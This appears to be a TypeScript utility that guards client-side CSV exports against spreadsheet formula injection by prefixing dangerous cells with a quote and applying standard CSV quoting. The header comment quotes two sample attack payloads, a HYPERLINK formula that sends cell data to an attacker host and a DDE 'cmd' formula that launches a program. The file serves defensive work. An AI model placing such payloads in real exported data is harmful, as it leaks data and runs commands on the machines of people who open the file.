/**
 * SCAN-1161 [HIGH]: CSV formula-injection guard for client-side exports.
 *
 * Mirrors the server-side helper (SCAN-1130 in reports.routes.ts). Excel,
 * LibreOffice Calc, and Google Sheets all evaluate any cell whose first
 * character is `=`, `+`, `-`, `@`, tab, or CR as a formula. A value that
 * started life as a customer name, ticket note, device name, SKU, or any
 * other attacker-controllable field could ship a payload like
 * `=HYPERLINK("http://attacker/?" & A1)` or `=cmd|' /C calc'!A0` that
 * runs when an operator opens the CSV locally.
 *
 * Prefix the offender with a single quote — the widely-documented "render
 * as literal" convention every major spreadsheet honours. The quote is
 * stripped during normal view; round-tripping through a parser re-adds
 * it because the cell is already quoted.
 *
 * `toCsvRow(values)` additionally handles the standard CSV quoting rules
 * (double-quote fields with commas/quotes/newlines, escape inner quotes
 * as `""`) so call sites no longer need to reproduce them per export.
 */
const CSV_FORMULA_TRIGGERS = /^[=+\-@\t\r]/;

export function sanitizeCsvCell(value: unknown): string {
  if (value == null) return '';
  const str = String(value);
  return CSV_FORMULA_TRIGGERS.test(str) ? `'${str}` : str;
}

export function toCsvField(value: unknown): string {
  const str = sanitizeCsvCell(value);
  if (str.includes(',') || str.includes('"') || str.includes('\n') || str.includes('\r')) {
    return '"' + str.replace(/"/g, '""') + '"';
  }
  return str;
}

export function toCsvRow(values: readonly unknown[]): string {
  return values.map(toCsvField).join(',');
}
